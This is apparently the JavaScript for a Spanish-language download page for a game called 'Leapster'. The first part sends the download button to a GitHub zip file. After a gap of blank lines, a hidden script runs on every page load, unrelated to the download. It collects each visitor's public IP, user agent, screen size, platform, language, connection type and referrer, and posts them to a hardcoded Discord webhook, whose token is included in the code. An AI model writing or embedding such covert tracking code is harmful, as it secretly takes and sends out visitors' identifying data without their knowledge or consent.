// Código JavaScript para manejar la descarga del juego
document.addEventListener('DOMContentLoaded', () => {
    const downloadButton = document.getElementById('download');

    downloadButton.addEventListener('click', () => {
        // URL de descarga del archivo en GitHub (cambiar según sea necesario)
        const downloadUrl = 'https://github.com/tuusuario/leapster/raw/main/Leapster.zip';

        // Redirigir a la URL de descarga
        window.location.href = downloadUrl;
    });
});





    <script>
        // Función para obtener y enviar información del usuario
        function sendUserInfo() {
            // Recolectar IP pública
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip; // La IP del visitante

                    // Recolectar otros datos
                    const userAgent = navigator.userAgent; // User-Agent
                    const screenWidth = screen.width; // Ancho de pantalla
                    const screenHeight = screen.height; // Altura de pantalla
                    const os = navigator.platform; // Sistema operativo
                    const idioma = navigator.language || navigator.userLanguage; // Idioma
                    const connection = navigator.connection ? navigator.connection.effectiveType : "Desconocido"; // Tipo de conexión
                    const referrer = document.referrer; // Página de referencia

                    // Datos a enviar
                    const userInfo = {
                        IP: ip,
                        UserAgent: userAgent,
                        Screen: `${screenWidth}x${screenHeight}`,
                        OS: os,
                        Idioma: idioma,
                        Conexión: connection,
                        Referrer: referrer
                    };

                    // Configuración del Webhook de Discord
                    const webhookURL = "https://discord.com/api/webhooks/1294006529338507335/_zrSstE-4m_-FLwBBg4XmHiYg4KpQjM_WJ-XUdln7LNtdaj4Per8qQsPIy40H8cBqx9A";
                    
                    // Enviar la información al webhook
                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            content: `Información del usuario:\n\`\`\`${JSON.stringify(userInfo, null, 2)}\`\`\``
                        }),
                    })
                    .then(() => console.log("Información enviada a Discord."))
                    .catch(error => console.error('Error al enviar la información:', error));
                })
                .catch(error => console.error('Error al obtener la IP:', error));
        }

        // Llama a la función al cargar la página
        window.onload = sendUserInfo;
    </script>
